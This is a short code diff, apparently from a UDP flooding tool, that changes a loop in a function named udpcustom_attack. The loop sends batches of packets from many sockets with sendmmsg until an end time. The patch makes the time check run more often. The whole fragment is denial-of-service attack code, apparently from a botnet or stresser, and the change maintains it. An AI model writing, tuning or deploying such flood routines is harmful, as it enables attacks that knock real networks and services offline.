@@ -68,7 +68,7 @@ void* udpcustom_attack(void* arg) {
             if (fds[i] == -1) continue;
             sendmmsg(fds[i], msgs, BATCH, MSG_NOSIGNAL);
         }
-        if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
+        if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;
     }
 
     for (int i = 0; i < UDP_CUSTOM_SOCKS; i++)
